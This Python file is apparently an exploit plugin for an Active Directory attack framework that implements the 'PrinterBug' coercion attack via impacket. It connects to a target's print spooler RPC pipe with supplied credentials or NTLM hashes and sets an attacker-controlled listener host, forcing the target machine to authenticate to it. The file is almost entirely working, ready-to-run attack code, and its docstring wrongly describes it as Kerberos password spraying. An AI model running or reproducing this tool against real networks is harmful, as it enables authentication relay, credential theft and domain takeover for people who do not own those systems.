import argparse
from copy import copy
import socket

from impacket.dcerpc.v5 import transport, rprn
from impacket.dcerpc.v5.dtypes import NULL

from plugins.AD import PluginAdExploitBase
from utils import output
from utils.consts import AllPluginTypes


class PrinterBug(object):
    KNOWN_PROTOCOLS = {
        139: {'bindstr': r'ncacn_np:%s[\pipe\spoolss]', 'set_host': True},
        445: {'bindstr': r'ncacn_np:%s[\pipe\spoolss]', 'set_host': True},
    }

    def __init__(self, username='', password='', domain='', port=None,
                 hashes=None, attackerhost='', ping=True, timeout=1):

        self.__username = username
        self.__password = password
        self.__port = port
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__attackerhost = attackerhost
        self.__tcp_ping = ping
        self.__tcp_timeout = timeout
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def dump(self, remote_host):

        output.info('Attempting to trigger authentication via rprn RPC at %s' % remote_host)

        stringbinding = self.KNOWN_PROTOCOLS[self.__port]['bindstr'] % remote_host
        # logging.info('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)

        if self.KNOWN_PROTOCOLS[self.__port]['set_host']:
            rpctransport.setRemoteHost(remote_host)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

        try:
            self.lookup(rpctransport, remote_host)
        except Exception as e:
            if output.getLogger().level == output.DEBUG:
                import traceback
                traceback.print_exc()
            output.critical("An unhandled exception has occured. Please open up an issue! Continueing...")
            output.critical(str(e))

    def ping(self, host):
        # Code stolen from https://github.com/fox-it/BloodHound.py/blob/1124a1b5c6f62fa6c058f7294251c7cb223e3d66/bloodhound/ad/utils.py#L126 and slightly modified by @tacticalDevC
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.__tcp_timeout)
            s.connect((host, self.__port))
            s.close()
            return True
        except KeyboardInterrupt:
            raise
        except:
            return False

    def lookup(self, rpctransport, host):
        if self.__tcp_ping and self.ping(host) is False:
            output.info("Host is offline. Skipping!")
            return

        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except Exception as e:
            # Probably this isn't a Windows machine or SMB is closed
            output.error("Timeout - Skipping host!")
            return
        dce.bind(rprn.MSRPC_UUID_RPRN)
        output.info('Bind OK')
        try:
            resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % host)
        except Exception as e:
            if str(e).find('Broken pipe') >= 0:
                # The connection timed-out. Let's try to bring it back next round
                output.error('Connection failed - skipping host!')
                return
            elif str(e).upper().find('ACCESS_DENIED'):
                # We're not admin, bye
                output.error('Access denied - RPC call was denied')
                dce.disconnect()
                return
            else:
                raise
        output.info('Got handle')

        request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
        request['hPrinter'] = resp['pHandle']
        request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
        request['pszLocalMachine'] = '\\\\%s\x00' % self.__attackerhost
        request['pOptions'] = NULL
        try:
            resp = dce.request(request)
        except Exception as e:
            print(e)
        output.info('Triggered RPC backconnect, this may or may not have worked')

        dce.disconnect()

        return None


class PluginADPrintBug(PluginAdExploitBase):
    """
    kerberos 密码爆破&密码喷洒
    """

    display = "打印机漏洞"
    alias = "printbug"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.add_argument("-d", "--domain", help="domain name(test.local)", dest="domain")
        parser.add_argument("-p", "--password", help="password", dest="password")
        parser.add_argument("-u", "--user", help="auth user", dest="user")
        parser.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH",
                            help='NTLM hashes, format is LMHASH:NTHASH')
        parser.add_argument("--dc-ip", help="ip address of dc", dest="dc_ip")
        parser.add_argument("-t", "--target", help="target ip", dest="target")
        parser.add_argument("-l", "--listener", help="listener ip", dest="listener")
        parser.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                            help='Destination port to connect to SMB Server')
        parser.add_argument("-timeout",
                            action="store",
                            metavar="timeout",
                            default=1,
                            help="Specify a timeout for the TCP ping check")
        parser.add_argument("-no-ping",
                            action="store_false",
                            help="Specify if a TCP ping should be done before connection" \
                                 "NOT recommended since SMB timeouts default to 300 secs and the TCP ping assures "
                                 "connectivity to the SMB port")

    def run_script(self, args) -> dict:
        from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED
        """
        脚本入口函数
        :return: bool
        """
        # password brute
        lookup = PrinterBug(args.user, args.password, args.domain, int(args.port), args.hashes, args.listener,
                            args.no_ping, float(args.timeout))
        try:
            lookup.dump(args.target)
        except Exception as e:
            output.error(e)

        result = copy(self.result)
        return result


if __name__ == '__main__':
    pass
